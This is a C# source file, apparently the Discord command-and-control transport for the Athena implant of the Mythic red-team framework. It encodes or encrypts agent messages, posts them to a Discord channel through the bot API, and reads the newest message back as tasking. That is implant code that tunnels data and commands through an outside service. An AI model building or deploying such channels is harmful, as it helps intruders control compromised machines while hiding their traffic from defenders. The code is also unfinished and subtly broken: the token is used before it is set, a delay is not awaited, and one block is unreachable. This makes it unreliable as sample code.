using Athena.Utilities;
using System;
using System.Net;
using System.Net.Security;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Net.Http;
using System.Text;
using System.Net.Http.Headers;

namespace Athena.Config
{
    public class MythicConfig
    {
        public Discord currentConfig { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public Forwarder forwarder { get; set; }
        public MythicConfig()
        {
            uuid = "c1a86a20-e6bc-4ab8-a3a8-5dd2c11cedac";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new Discord();
            this.forwarder = new Forwarder();
        }
    }
    public class Discord
    {
        public bool encrypted { get; set; }
        public string messageToken { get; set; }
        public string channel { get; set; }
        public int messageChecks { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private HttpClient discordClient = new HttpClient();
        private string BotToken { get; set; }
        private string ChannelID { get; set; }
        //  private string current_message { get; set; }
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private string agent_guid = Guid.NewGuid().ToString();
        public Discord()
        {

            discordClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", this.messageToken);
            //legacy scottie stuff migt not need but it might be base mythic shit
        }
        //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
        public async Task<string> Send(object obj)
        {
            Console.WriteLine("Send Called.");
            try
            {
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
                }

                //bases checking from sleep time 
                Task.Delay(this.timeBetweenChecks * 1000);// this should be sleep time based
                Console.WriteLine("Sending.");
                if (await SendMessage(json))
                {
                    Console.WriteLine("Getting Response");
                    var response = await ReadMessages();
                    json = response.FirstOrDefault().content;
                }


                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }
                else
                {
                    if (String.IsNullOrEmpty(json))
                    {
                        return json;
                    }
                    else
                    {
                        return (await Misc.Base64Decode(json)).Substring(36);
                    }
                }
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }
                else
                {
                    if (String.IsNullOrEmpty(json))
                    {
                        return json;
                    }
                    else
                    {
                        return (await Misc.Base64Decode(json)).Substring(36);
                    }
                }
            }
            catch
            {
                return "";
            }
        }
        public async Task<bool> SendMessage(String Cmd)
        {
            var URL = "https://discord.com/api/channels/" + this.ChannelID + "/messages";
            var Payload = new Dictionary<string, string>()
            {
              {"content" , Cmd }
            };
            var content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
            var res = await discordClient.PostAsync(URL, content);
            string ResponseMessages = await res.Content.ReadAsStringAsync();

            Console.WriteLine(ResponseMessages);

            return true;
        }

        public async Task<List<ServerDetails>> ReadMessages()
        {
            var URL = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=1"; //Adding limit means only get newest
            var res = await discordClient.GetAsync(URL);
            string ResponseMessages = await res.Content.ReadAsStringAsync();
            return JsonConvert.DeserializeObject<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
        }

        //adding Json Classes
        public class GetServerDetails
        {
            public string id { get; set; }
            public int type { get; set; }
            public string name { get; set; }
            public int position { get; set; }
            public int flags { get; set; }
            public string parent_id { get; set; }
            public string guild_id { get; set; }
            public List<object> permission_overwrites { get; set; }
            public string last_message_id { get; set; }
            public object topic { get; set; }
            public int? rate_limit_per_user { get; set; }
            public bool? nsfw { get; set; }
            public int? bitrate { get; set; }
            public int? user_limit { get; set; }
            public object rtc_region { get; set; }
        }
        public class Author
        {
            public string id { get; set; }
            public string username { get; set; }
            public object avatar { get; set; }
            public object avatar_decoration { get; set; }
            public string discriminator { get; set; }
            public int public_flags { get; set; }
            public bool? bot { get; set; }
        }
        public class ServerDetails
        {
            public string id { get; set; }
            public int type { get; set; }
            public string content { get; set; }
            public string channel_id { get; set; }
            public Author author { get; set; }
            public List<object> attachments { get; set; }
            public List<object> embeds { get; set; }
            public List<object> mentions { get; set; }
            public List<object> mention_roles { get; set; }
            public bool pinned { get; set; }
            public bool mention_everyone { get; set; }
            public bool tts { get; set; }
            public DateTime timestamp { get; set; }
            public object edited_timestamp { get; set; }
            public int flags { get; set; }
            public List<object> components { get; set; }
            public string webhook_id { get; set; }
        }
        public class ChannelResponse
        {
            public string id { get; set; }
            public object last_message_id { get; set; }
            public int type { get; set; }
            public string name { get; set; }
            public int position { get; set; }
            public int flags { get; set; }
            public object parent_id { get; set; }
            public object topic { get; set; }
            public string guild_id { get; set; }
            public List<object> permission_overwrites { get; set; }
            public int rate_limit_per_user { get; set; }
            public bool nsfw { get; set; }
        }
        public class ChannelCreateSend
        {
            public string name { get; set; }
            public int type { get; set; }
        }
    }
}